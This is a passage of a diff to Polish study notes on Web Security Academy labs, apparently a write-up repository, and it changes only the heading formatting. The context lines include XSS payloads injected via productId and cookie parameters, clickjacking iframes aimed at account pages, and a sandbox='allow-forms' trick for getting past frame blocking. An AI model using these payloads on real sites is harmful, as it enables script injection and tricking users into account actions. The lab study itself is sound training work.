@@ -324,7 +324,7 @@ i mamy:
 3. Jako productId możemy wpisać skrypt i będzie on wykonany z tej właśnie subdomeny
 4. Konstruujemy skrypt i dodajemy do na exploit server:
 
-### Payload
+Payload:
 ```
     <script>
         document.location="http://stock.0a100003032beefac0af231c00de0028.web-security-academy.net/?productId=4
@@ -371,7 +371,7 @@ i mamy:
     	<iframe src="https://0ae300220338ea26c0e098a70076003a.web-security-academy.net/my-account"> </iframe>
     </body>
 ```
-### Jeśli strona blokuje odpalanie jej w framie pomóc może dodanie sandbox="allow-forms":
+Jeśli strona blokuje odpalanie jej w framie pomóc może dodanie sandbox="allow-forms":
 ```
 <iframe src="https://0a3d000a04b97a33c050232a0098006e.web-security-academy.net/my-account" sandbox="allow-forms"> </iframe>
 ```
@@ -408,7 +408,7 @@ https://0aff009b03b537c9c039ad9c00ff0051.web-security-academy.net/post?postId=7#
 	- ładujemy stronę z iframea, a do cookie zostanie wpisany lkiink
 	- następnie robimy redirect, wtedy załaduje się link do przycisku, a tym samym wykona się skrypt
 
-### Payload:
+Payload:
 ```
 <iframe  width=1000px height=1000px src="https://0a8f00a8033e9886c0653d3300fa008e.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="window.location.href = 'https://0a8f00a8033e9886c0653d3300fa008e.web-security-academy.net/';">
 ```
